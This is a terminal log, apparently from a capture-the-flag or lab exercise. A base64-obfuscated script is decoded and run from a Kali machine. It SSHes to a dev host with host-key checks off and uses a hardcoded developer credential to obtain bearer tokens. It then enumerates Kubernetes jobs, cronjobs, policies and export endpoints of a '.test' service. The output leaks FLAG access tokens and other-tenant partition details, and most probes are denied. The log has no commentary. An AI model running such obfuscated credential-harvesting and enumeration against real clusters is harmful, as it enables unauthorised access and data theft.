@@ -1,0 +1,428 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r27.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApLPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0OjY0NDMKVT0icm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIKV1Q9JChjdXJsIC1zU2sgLW0gMTAgLXUgIiRVIiAtWCBQT1NUIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS93b3Jrc3BhY2VzL2N1cnJlbnQvdG9rZW4tZXhjaGFuZ2UiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKRUo9JChjdXJsIC1zU2sgLW0gMTAgLVggUE9TVCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXVCIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3Rva2VuLWV4Y2hhbmdlL2ZpZWxka2VzdC1leHBvcnQtYWNjZXNzIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbjtwcmludChqc29uLmxvYWQoc3lzLnN0ZGluKS5nZXQoImFjY2Vzc190b2tlbiIsIiIpKScpCmcoKXsgbj0iJDEiOyBzaGlmdDsgZWNobyAiIyMjIyMgJG4iOyBjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC13ICdcblsle2h0dHBfY29kZX1dXG4nICIkQCIgfCBoZWFkIC1jIDYwMDA7IGVjaG87IH0KZWNobyAiIyMjIyMjIyMjIyBLOFMgSk9CIC8gQ1JPTkpPQiIKZyAiam9iIGV4cC0yODQxIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRLL2FwaXMvYmF0Y2gvdjEvbmFtZXNwYWNlcy9maWVsZGxpbmsvam9icy9leHAtMjg0MSIKZyAiY3JvbmpvYiBzY2hlZC0yODQxIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRLL2FwaXMvYmF0Y2gvdjEvbmFtZXNwYWNlcy9maWVsZGxpbmsvY3JvbmpvYnMvc2NoZWQtMjg0MSIKZyAicG9kcyBnZXQgZXhwLTI4NDEiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJEVKIiAiJEsvYXBpL3YxL25hbWVzcGFjZXMvZmllbGRsaW5rL3BvZHMvZXhwLTI4NDEiCmcgInBvZHMgbGlzdCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkSy9hcGkvdjEvbmFtZXNwYWNlcy9maWVsZGxpbmsvcG9kcyIKZWNobyAiIyMjIyMjIyMjIyBQT0xJQ1kgSUQgQ0FORElEQVRFUyIKZm9yIHAgaW4gZXhwLTI4NDEtZGVmaW5pdGlvbiBleHAtMjg0MSBzY2hlZC0yODQxIHN1cHBvcnQtY2FzZS1oaXN0b3J5IEVYUC0yODQxIGV4cG9ydC0yODQxIHN1cHBvcnQtZXhwb3J0IEVYUC0yODQxLXJvd2FuIEVYUC0yODQxLW1heWE7IGRvCiBnICJFSiAvYXBpL3BvbGljaWVzLyRwIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRCL2FwaS9wb2xpY2llcy8kcCIKZG9uZQplY2hvICIjIyMjIyMjIyMjIEVYUE9SVCBSVU5TIFZBUklBTlRTIgpmb3IgdSBpbiAiYXBpL2V4cG9ydHMvRVhQLTI4NDEvcnVucyIgImFwaS9leHBvcnRzL0VYUC0yODQxL3J1bnM/bGltaXQ9MTAiICJhcGkvZXhwb3J0cy9FWFAtMjg0MS9ydW4iICJhcGkvZXhwb3J0cy9FWFAtMjg0MS9yZWNvcmRzIjsgZG8KIGcgIkVKICR1IiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRCLyR1Igpkb25lCmVjaG8gIiMjIyMjIyMjIyMgREFUQVNFVCBSRUNPUkQgQ0FORElEQVRFUyAoc3VwcG9ydC1jYXNlLWhpc3RvcnkpIgpmb3IgdSBpbiAiYXBpL2RhdGFzZXRzL3N1cHBvcnQtY2FzZS1oaXN0b3J5IiAiYXBpL2V4cG9ydHMvRVhQLTI4NDEvZGF0YXNldCIgImFwaS9leHBvcnRzL0VYUC0yODQxL2RhdGEiICJhcGkvc3VwcG9ydC9leHBvcnRzL0VYUC0yODQxIiAiYXBpL3N1cHBvcnQvZGF0YS9FWFAtMjg0MSI7IGRvCiBnICJFSiAkdSIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiICIkQi8kdSIKZG9uZQplY2hvIERPTkVfUjI3ClJTSAplY2hvIEZJTklTSEVECg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r27.sh; bash /tmp/k14_r27.sh; echo DONEMARK_1795208230713$((6*7))
+########## K8S JOB / CRONJOB
+##### job exp-2841
+{
+  "kind": "Job",
+  "apiVersion": "batch/v1",
+  "metadata": {
+    "name": "exp-2841",
+    "namespace": "fieldlink",
+    "uid": "765a1fd8-5b0b-4873-be17-0bf89348158e",
+    "resourceVersion": "10409",
+    "generation": 1,
+    "creationTimestamp": "2026-11-19T13:42:24Z",
+    "labels": {
+      "fieldkest.io/case-id": "CAS-MAYA-2841",
+      "fieldkest.io/export-id": "EXP-2841",
+      "fieldkest.io/kind": "export-job"
+    },
+    "annotations": {
+      "fieldkest.io/access-token": "FLAG{6b4342f2b090f8d2}",
+      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"batch/v1\",\"kind\":\"Job\",\"metadata\":{\"annotations\":{\"fieldkest.io/access-token\":\"FLAG{6b4342f2b090f8d2}\"},\"labels\":{\"fieldkest.io/case-id\":\"CAS-MAYA-2841\",\"fieldkest.io/export-id\":\"EXP-2841\",\"fieldkest.io/kind\":\"export-job\"},\"name\":\"exp-2841\",\"namespace\":\"fieldlink\"},\"spec\":{\"backoffLimit\":0,\"template\":{\"spec\":{\"containers\":[{\"env\":[{\"name\":\"EXPORT_ID\",\"value\":\"EXP-2841\"},{\"name\":\"CASE_ID\",\"value\":\"CAS-MAYA-2841\"},{\"name\":\"DATASET\",\"value\":\"support-case-history\"},{\"name\":\"REVISION\",\"value\":\"6\"},{\"name\":\"STATE\",\"value\":\"unpublished\"},{\"name\":\"DESTINATION\",\"value\":\"fieldkest-exports\"}],\"image\":\"busybox:latest\",\"name\":\"exporter\"}],\"restartPolicy\":\"Never\"}}}}\n"
+    },
+    "managedFields": [
+      {
+        "manager": "kubectl-client-side-apply",
+        "operation": "Update",
+        "apiVersion": "batch/v1",
+        "time": "2026-11-19T13:42:24Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:metadata": {
+            "f:annotations": {
+              ".": {},
+              "f:fieldkest.io/access-token": {},
+              "f:kubectl.kubernetes.io/last-applied-configuration": {}
+            },
+            "f:labels": {
+              ".": {},
+              "f:fieldkest.io/case-id": {},
+              "f:fieldkest.io/export-id": {},
+              "f:fieldkest.io/kind": {}
+            }
+          },
+          "f:spec": {
+            "f:backoffLimit": {},
+            "f:completionMode": {},
+            "f:completions": {},
+            "f:manualSelector": {},
+            "f:parallelism": {},
+            "f:podReplacementPolicy": {},
+            "f:suspend": {},
+            "f:template": {
+              "f:spec": {
+                "f:containers": {
+                  "k:{\"name\":\"exporter\"}": {
+                    ".": {},
+                    "f:env": {
+                      ".": {},
+                      "k:{\"name\":\"CASE_ID\"}": {
+                        ".": {},
+                        "f:name": {},
+                        "f:value": {}
+                      },
+                      "k:{\"name\":\"DATASET\"}": {
+                        ".": {},
+                        "f:name": {},
+                        "f:value": {}
+                      },
+                      "k:{\"name\":\"DESTINATION\"}": {
+                        ".": {},
+                        "f:name": {},
+                        "f:value": {}
+                      },
+                      "k:{\"name\":\"EXPORT_ID\"}": {
+                        ".": {},
+                        "f:name": {},
+                        "f:value": {}
+                      },
+                      "k:{\"name\":\"REVISION\"}": {
+                        ".": {},
+                        "f:name": {},
+                        "f:value": {}
+                      },
+                      "k:{\"name\":\"STATE\"}": {
+                        ".": {},
+                        "f:name": {},
+                        "f:value": {}
+                      }
+                    },
+                    "f:image": {},
+                    "f:imagePullPolicy": {},
+                    "f:name": {},
+                    "f:resources": {},
+                    "f:terminationMessagePath": {},
+                    "f:terminationMessagePolicy": {}
+                  }
+                },
+                "f:dnsPolicy": {},
+                "f:restartPolicy": {},
+                "f:schedulerName": {},
+                "f:securityContext": {},
+                "f:terminationGracePeriodSeconds": {}
+              }
+            }
+          }
+        }
+      },
+      {
+        "manager": "k3s",
+        "operation": "Update",
+        "apiVersion": "batch/v1",
+        "time": "2026-11-19T13:42:25Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:status": {
+            "f:ready": {},
+            "f:startTime": {},
+            "f:terminating": {},
+            "f:uncountedTerminatedPods": {}
+          }
+        },
+        "subresource": "status"
+      }
+    ]
+  },
+  "spec": {
+    "parallelism": 1,
+    "completions": 1,
+    "backoffLimit": 0,
+    "selector": {
+      "matchLabels": {
+        "batch.kubernetes.io/controller-uid": "765a1fd8-5b0b-4873-be17-0bf89348158e"
+      }
+    },
+    "manualSelector": false,
+    "template": {
+      "metadata": {
+        "labels": {
+          "batch.kubernetes.io/controller-uid": "765a1fd8-5b0b-4873-be17-0bf89348158e",
+          "batch.kubernetes.io/job-name": "exp-2841",
+          "controller-uid": "765a1fd8-5b0b-4873-be17-0bf89348158e",
+          "job-name": "exp-2841"
+        }
+      },
+      "spec": {
+        "containers": [
+          {
+            "name": "exporter",
+            "image": "busybox:latest",
+            "env": [
+              {
+                "name": "EXPORT_ID",
+                "value": "EXP-2841"
+              },
+              {
+                "name": "CASE_ID",
+                "value": "CAS-MAYA-2841"
+              },
+              {
+                "name": "DATASET",
+                "value": "support-case-history"
+              },
+              {
+                "name": "REVISION",
+                "value": "6"
+              },
+              {
+                "name": "STATE",
+                "value": "unpublished"
+              },
+              {
+                "name": "DESTINATION",
+                "value": "fieldkest-exports"
+
+##### cronjob sched-2841
+{
+  "kind": "CronJob",
+  "apiVersion": "batch/v1",
+  "metadata": {
+    "name": "sched-2841",
+    "namespace": "fieldlink",
+    "uid": "ae4e035a-3f14-46c6-a48b-bede3bb86381",
+    "resourceVersion": "53979",
+    "generation": 4,
+    "creationTimestamp": "2026-11-19T07:07:24Z",
+    "labels": {
+      "fieldkest.io/case-id": "CAS-MAYA-2841",
+      "fieldkest.io/kind": "support-schedule",
+      "fieldkest.io/schedule-id": "SCHED-2841"
+    },
+    "annotations": {
+      "fieldkest.io/access-token": "FLAG{25a027fe80e77ca0}",
+      "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"batch/v1\",\"kind\":\"CronJob\",\"metadata\":{\"annotations\":{},\"labels\":{\"fieldkest.io/case-id\":\"CAS-MAYA-2841\",\"fieldkest.io/kind\":\"support-schedule\",\"fieldkest.io/schedule-id\":\"SCHED-2841\"},\"name\":\"sched-2841\",\"namespace\":\"fieldlink\"},\"spec\":{\"concurrencyPolicy\":\"Forbid\",\"jobTemplate\":{\"spec\":{\"backoffLimit\":0,\"template\":{\"spec\":{\"containers\":[{\"command\":[\"sh\",\"-c\",\"echo Job complete: $SCHEDULE_ID assignment=$ASSIGNMENT marker=$MARKER; exit 0\"],\"env\":[{\"name\":\"SCHEDULE_ID\",\"value\":\"SCHED-2841\"},{\"name\":\"CASE_ID\",\"value\":\"CAS-MAYA-2841\"},{\"name\":\"ASSIGNMENT\",\"value\":\"CAS-MAYA-2841\"},{\"name\":\"PROFILE\",\"value\":\"support-export\"},{\"name\":\"STARTUP_CONFIG\",\"value\":\"EXP-2841\"},{\"name\":\"DESTINATION\",\"value\":\"fieldkest-exports\"},{\"name\":\"NEXT_ASSIGNMENT\",\"value\":\"field-operator-b\"},{\"name\":\"ALLOWED_STARTUP_CONFIG\",\"value\":\"EXP-2841\"}],\"image\":\"rancher/klipper-helm:v0.13.3-build20261021\",\"name\":\"exporter\",\"securityContext\":{\"allowPrivilegeEscalation\":false,\"capabilities\":{\"drop\":[\"ALL\"]},\"seccompProfile\":{\"type\":\"RuntimeDefault\"}}}],\"restartPolicy\":\"Never\",\"securityContext\":{\"runAsNonRoot\":true,\"runAsUser\":65534,\"seccompProfile\":{\"type\":\"RuntimeDefault\"}},\"serviceAccountName\":\"svc-schedule-runner\",\"tolerations\":[{\"effect\":\"NoSchedule\",\"key\":\"node.kubernetes.io/disk-pressure\",\"operator\":\"Exists\"},{\"effect\":\"NoSchedule\",\"key\":\"node.kubernetes.io/memory-pressure\",\"operator\":\"Exists\"}]}}}},\"schedule\":\"0 8 * * *\"}}\n"
+    },
+    "managedFields": [
+      {
+        "manager": "kubectl-client-side-apply",
+        "operation": "Update",
+        "apiVersion": "batch/v1",
+        "time": "2026-11-19T07:07:24Z",
+        "fieldsType": "FieldsV1",
+        "fieldsV1": {
+          "f:metadata": {
+            "f:annotations": {
+              ".": {},
+              "f:kubectl.kubernetes.io/last-applied-configuration": {}
+            },
+            "f:labels": {
+              ".": {},
+              "f:fieldkest.io/case-id": {},
+              "f:fieldkest.io/kind": {},
+              "f:fieldkest.io/schedule-id": {}
+            }
+          },
+          "f:spec": {
+            "f:concurrencyPolicy": {},
+            "f:failedJobsHistoryLimit": {},
+            "f:jobTemplate": {
+              "f:spec": {
+                "f:backoffLimit": {},
+                "f:template": {
+                  "f:spec": {
+                    "f:containers": {
+                      "k:{\"name\":\"exporter\"}": {
+                        ".": {},
+                        "f:env": {
+                          ".": {},
+                          "k:{\"name\":\"ALLOWED_STARTUP_CONFIG\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          },
+                          "k:{\"name\":\"ASSIGNMENT\"}": {
+                            ".": {},
+                            "f:name": {}
+                          },
+                          "k:{\"name\":\"CASE_ID\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          },
+                          "k:{\"name\":\"DESTINATION\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          },
+                          "k:{\"name\":\"NEXT_ASSIGNMENT\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          },
+                          "k:{\"name\":\"PROFILE\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          },
+                          "k:{\"name\":\"SCHEDULE_ID\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          },
+                          "k:{\"name\":\"STARTUP_CONFIG\"}": {
+                            ".": {},
+                            "f:name": {},
+                            "f:value": {}
+                          }
+                        },
+                        "f:image": {},
+                        "f:imagePullPolicy": {},
+                        "f:name": {},
+                        "f:resources": {},
+                        "f:securityContext": {
+                          ".": {},
+                          "f:allowPrivilegeEscalation": {},
+                          "f:capabilities": {
+                            ".": {},
+                            "f:drop": {}
+                          },
+                          "f:seccompProfile": {
+                            ".": {},
+                            "f:type": {}
+                          }
+                        },
+                        "f:terminationMessagePath": {},
+                        "f:terminationMessagePolicy": {}
+                      }
+                    },
+                    "f:dnsPolicy": {},
+                    "f:restartPolicy": {},
+                    "f:schedulerName": {},
+                    "f:securityContext": {
+                      ".": {},
+                      "f:runAs
+##### pods get exp-2841
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "pods \"exp-2841\" is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot get resource \"pods\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "name": "exp-2841",
+    "kind": "pods"
+  },
+  "code": 403
+}
+[403]
+
+##### pods list
+curl: (23) Failed writing body
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "pods is forbidden: User \"system:serviceaccount:fieldlink:svc-fieldlink-export\" cannot list resource \"pods\" in API group \"\" in the namespace \"fieldlink\"",
+  "reason": "Forbidden",
+  "details": {
+    "kind": "pods"
+  },
+  "code": 403
+}
+[403]
+
+########## POLICY ID CANDIDATES
+##### EJ /api/policies/exp-2841-definition
+{"access_token":"FLAG{bd60dc9d170bc2c7}","case_id":"CAS-MAYA-2841","destination":"fieldkest-exports/EXP-2841-rowan","destinations":"[{\"name\":\"fieldkest-exports/EXP-2841-rowan\",\"owner\":\"rowan.ito\"},{\"name\":\"fieldkest-exports/EXP-2841-maya\",\"owner\":\"maya.ranscombe\"}]","export_id":"EXP-2841","owner":"maya.ranscombe","partition_bindings":"[{\"partition\":\"PART-ARWC-01\",\"current\":true,\"tenant\":\"TEN-ARWC-047\",\"tenant_id\":\"TEN-ARWC-047\",\"connector_revision\":\"FLK-7.4.2\",\"revision\":6},{\"partition\":\"PART-ARWC-02\",\"current\":false,\"tenant\":\"TEN-OTHER-001\",\"tenant_id\":\"TEN-OTHER-001\",\"connector_revision\":\"FLK-7.3.1\",\"revision\":5}]","partitions":"[\"PART-ARWC-01\"]","policy_id":"exp-2841-definition","revision":"10","schema":"fieldkest.export-definition/v1","tenant":"TEN-ARWC-047","tenant_id":"TEN-ARWC-047"}
+
+[200]
+
+##### EJ /api/policies/exp-2841
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/sched-2841
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/support-case-history
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/EXP-2841
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/export-2841
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/support-export
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/EXP-2841-rowan
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/EXP-2841-maya
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+########## EXPORT RUNS VARIANTS
+##### EJ api/exports/EXP-2841/runs
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ api/exports/EXP-2841/runs?limit=10
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ api/exports/EXP-2841/run
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ api/exports/EXP-2841/records
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+########## DATASET RECORD CANDIDATES (support-case-history)
+##### EJ api/datasets/support-case-history
+{"error":"authentication_required"}
+
+[401]
+
+##### EJ api/exports/EXP-2841/dataset
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ api/exports/EXP-2841/data
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ api/support/exports/EXP-2841
+{"error":"authentication_required"}
+
+[401]
+
+##### EJ api/support/data/EXP-2841
+{"error":"authentication_required"}
+
+[401]
+
+DONE_R27
+FINISHED
